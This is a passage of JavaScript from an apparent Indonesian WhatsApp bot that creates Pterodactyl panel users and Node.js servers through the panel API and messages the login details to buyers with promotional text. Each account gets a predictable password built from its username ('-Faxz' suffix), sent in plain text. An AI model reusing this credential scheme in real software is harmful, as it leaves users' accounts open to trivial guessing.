const ctf = `📦 \`Kring Kring Pakett\` 📦 ͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏

  *BERIKUT DATA AKUN PANEL DARI BG FAXZ YG GANTENG BANGET🗿🤙*

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
<========{[ \`PERBATASAN\` ]}=======>

\`WAJIB SAVE NO ATMIN UTAMA :\` 6283116555026
\`JOIN SALURAN NGAP :\` https://whatsapp.com/channel/0029VadfaUY2v1IsC78Cqa2z

*_YANG GA SAVE MANDUL MINIMAL KALO MAU SV CHAT DULU BIAR KE SAVE BACK_*

*UDAH GITU AJA*
=====================================
© Always Faxz`
AlwaysFaxzMd.sendMessage(u, { caption: ctf, image: fs.readFileSync("./lib/system/pterodactyl.jpg") });
let data2 = await f2.json();


let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "</> 々Always Faxz 々 </>\nWA : 6283116555026",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": "if [[ -d .git ]] && [[ \${AUTO_UPDATE} == \"1\" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/\${CMD_RUN}",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return replyalwaysfaxz(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await replyalwaysfaxz(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "9gb": {
if (!isPremium) return replyalwaysfaxz(`*\`[ # ]\`* _Fitur Ini Khusus Premium_\n*Jika Belum Premium Silahkan Ketik => .buypremium*`)
let t = text.split(',');
if (t.length < 2) return replyalwaysfaxz(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location3
let memo = "9050"
let cpu = "270"
let disk = "9050"
let email = username + "Faxz@ganteng.com"

if (!u) return
let d = (await AlwaysFaxzMd.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "-Faxz"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return replyalwaysfaxz(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

const ctf = `📦 \`Kring Kring Pakett\` 📦 ͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏

  *BERIKUT DATA AKUN PANEL DARI BG FAXZ YG GANTENG BANGET🗿🤙*

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
<========{[ \`PERBATASAN\` ]}=======>

\`WAJIB SAVE NO ATMIN UTAMA :\` 6283116555026
\`JOIN SALURAN NGAP :\` https://whatsapp.com/channel/0029VadfaUY2v1IsC78Cqa2z

*_YANG GA SAVE MANDUL MINIMAL KALO MAU SV CHAT DULU BIAR KE SAVE BACK_*

*UDAH GITU AJA*
=====================================
© Always Faxz`
AlwaysFaxzMd.sendMessage(u, { caption: ctf, image: fs.readFileSync("./lib/system/pterodactyl.jpg") });
let data2 = await f2.json();


let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "</> 々Always Faxz 々 </>\nWA : 6283116555026",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": "if [[ -d .git ]] && [[ \${AUTO_UPDATE} == \"1\" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/\${CMD_RUN}",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return replyalwaysfaxz(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await replyalwaysfaxz(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "10gb": {
if (!isPremium) return replyalwaysfaxz(`*\`[ # ]\`* _Fitur Ini Khusus Premium_\n*Jika Belum Premium Silahkan Ketik => .buypremium*`)
let t = text.split(',');
if (t.length < 2) return replyalwaysfaxz(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location3
let memo = "10050"
let cpu = "300"
let disk = "10050"
let email = username + "Faxz@ganteng.com"

if (!u) return
let d = (await AlwaysFaxzMd.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "-Faxz"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return replyalwaysfaxz(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

const ctf = `📦 \`Kring Kring Pakett\` 📦 ͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏

  *BERIKUT DATA AKUN PANEL DARI BG FAXZ YG GANTENG BANGET🗿🤙*

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
<========{[ \`PERBATASAN\` ]}=======>

\`WAJIB SAVE NO ATMIN UTAMA :\` 6283116555026
\`JOIN SALURAN NGAP :\` https://whatsapp.com/channel/0029VadfaUY2v1IsC78Cqa2z

*_YANG GA SAVE MANDUL MINIMAL KALO MAU SV CHAT DULU BIAR KE SAVE BACK_*

*UDAH GITU AJA*
=====================================
© Always Faxz`
AlwaysFaxzMd.sendMessage(u, { caption: ctf, image: fs.readFileSync("./lib/system/pterodactyl.jpg") });
let data2 = await f2.json();


let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "</> 々Always Faxz 々 </>\nWA : 6283116555026",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": "if [[ -d .git ]] && [[ \${AUTO_UPDATE} == \"1\" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/\${CMD_RUN}",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return replyalwaysfaxz(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await replyalwaysfaxz(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "unli": {
if (!isPremium) return replyalwaysfaxz(`*\`[ # ]\`* _Fitur Ini Khusus Premium_\n*Jika Belum Premium Silahkan Ketik => .buypremium*`)
let t = text.split(',');
if (t.length < 2) return replyalwaysfaxz(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location3
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "Faxz@ganteng.com"

if (!u) return
let d = (await AlwaysFaxzMd.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "-Faxz"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return replyalwaysfaxz(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

